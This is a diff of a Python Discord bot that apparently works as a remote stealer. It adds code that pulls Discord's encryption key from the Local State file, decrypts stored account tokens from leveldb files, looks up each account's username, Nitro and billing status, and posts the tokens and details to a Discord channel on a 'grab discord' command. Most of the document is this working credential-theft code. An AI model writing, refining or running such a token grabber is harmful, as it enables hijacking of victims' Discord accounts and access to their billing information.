@@ -34,11 +34,68 @@ async def ping(ctx):
 async def clear(ctx, amt):
     await ctx.channel.purge(limit=int(amt) + 1)
 
+def get_master_key():
+    with open(os.environ['APPDATA'] + '\\discord\\Local State', 'r') as file:
+        local_state = json.loads(file.read())
+    master_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
+    return win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
+
+def decrypt_token(buff, master_key):
+    try:
+        iv = buff[3:15]
+        payload = buff[15:]
+        cipher = AES.new(master_key, AES.MODE_GCM, iv)
+        decrypted_token = cipher.decrypt(payload)[:-16].decode()
+        return decrypted_token
+    except Exception:
+        return "Failed to decrypt token"
+
+def find_tokens(path, master_key):
+    tokens = set()
+    path += '\\Local Storage\\leveldb'
+    for file_name in os.listdir(path):
+        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+            continue
+        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors='ignore').readlines() if x.strip()]:
+            for regex in (r'dQw4w9WgXcQ:[^\"]*', r'mfa\.[\w-]{84}'):
+                for token in re.findall(regex, line):
+                    decrypted_token = decrypt_token(base64.b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)
+                    tokens.add(decrypted_token)
+    return tokens
+
+def grab_discord_info():
+    master_key = get_master_key()
+    token_list = find_tokens(os.getenv('APPDATA') + '\\discord', master_key)
+    user_info_list = []
+
+    for token in token_list:
+        headers = {
+            "Authorization": token
+        }
+        user_response = requests.get("https://discord.com/api/v9/users/@me", headers=headers)
+        
+        if user_response.status_code == 200:
+            user_data = user_response.json()
+            billing_response = requests.get("https://discord.com/api/v9/users/@me/billing/subscriptions", headers=headers)
+            nitro = billing_response.status_code == 200 and len(billing_response.json()) > 0
+            
+            # Add all necessary information to user_info_list
+            user_info = {
+                "token": token,
+                "username": user_data["username"],
+                "discriminator": user_data["discriminator"],
+                "nitro": nitro,
+                "billing": billing_response.status_code == 200,
+                "badges": user_data.get("public_flags", 0),
+                "avatar": user_data["avatar"],
+            }
+            user_info_list.append(user_info)
+    
+    return user_info_list
+
 def get_chrome_history():
     if platform.system() == 'Windows':
         history_path = os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Google\Chrome\User Data\Default\History')
-    elif platform.system() == 'Darwin':
-        history_path = os.path.expanduser('~/Library/Application Support/Google/Chrome/Default/History')
     else:
         history_path = os.path.expanduser('~/.config/google-chrome/Default/History')
 
@@ -170,55 +227,26 @@ async def grab(ctx, info, description='Grabs info on computer'):
             print("[ERR] %s"%str(e))
         os.remove(temp_file_path)
 
-    elif info == "discord":
-        # Logic for grabbing Discord tokens
-        path = os.path.join(os.environ['APPDATA'], 'Discord', 'Local Storage', 'leveldb')
-        token_list = []
+    if info.lower() == "discord":
+            discord_info = grab_discord_info()
+            if discord_info:
+                for user_info in discord_info:
+                    embed = discord.Embed(
+                        title="🎉 Discord Account Info",
+                        color=discord.Color.blue()
+                    )
+                    
+                    embed.add_field(name="Token", value=user_info["token"], inline=False)
+                    embed.add_field(name="Username", value=f"{user_info['username']}#{user_info['discriminator']}", inline=True)
+                    embed.add_field(name="Nitro", value="Yes" if user_info["nitro"] else "No", inline=True)
+                    embed.add_field(name="Billing", value="Yes" if user_info["billing"] else "No", inline=True)
+                    embed.add_field(name="Badges", value=str(user_info["badges"]), inline=True)
+                    avatar_url = f"https://cdn.discordapp.com/avatars/{user_info['username']}/{user_info['avatar']}.png" if user_info['avatar'] else "No avatar"
+                    embed.set_thumbnail(url=avatar_url)
 
-        # Loop through each file in the specified directory
-        for file_name in os.listdir(path):
-            if file_name.endswith('.log') or file_name.endswith('.ldb'):
-                with open(os.path.join(path, file_name), 'r', errors='ignore') as f:
-                    for line in f:
-                        # Look for lines that contain the token format
-                        if 'dQw4w9WgXcQ:' in line:  # A pattern indicative of a Discord token
-                            token = line.split('dQw4w9WgXcQ:')[1].strip()
-                            token_list.append(token)
-
-        # Prepare the embed to send the tokens
-        if token_list:
-            embed = discord.Embed(
-                title='Discord Tokens',
-                description="\n".join(token_list),
-                color=discord.Color.green()
-            )
-        else:
-            embed = discord.Embed(
-                title='Discord Tokens',
-                description="No tokens found.",
-                color=discord.Color.red()
-            )
-
-        await ctx.send(embed=embed)
-
-    if info == "history":
-        history = get_chrome_history()
-        temp_file_path = os.path.join(os.path.expanduser('~'), 'history.txt')
-        
-        with open(temp_file_path, 'w', encoding='utf-8') as file:
-            file.write(history)
-
-        if len(history) < 2000:
-            embed = discord.Embed(
-                title="Browser History",
-                description=history,
-                color=discord.Color.red()
-            )
-            await ctx.send(embed=embed)
-        else:
-            await ctx.send(file=discord.File(temp_file_path))
-
-        os.remove(temp_file_path)
+                    await ctx.send(embed=embed)
+            else:
+                await ctx.send("❌ No Discord tokens found.")
 
 @bot.command()
 async def show(ctx, whattoshow):
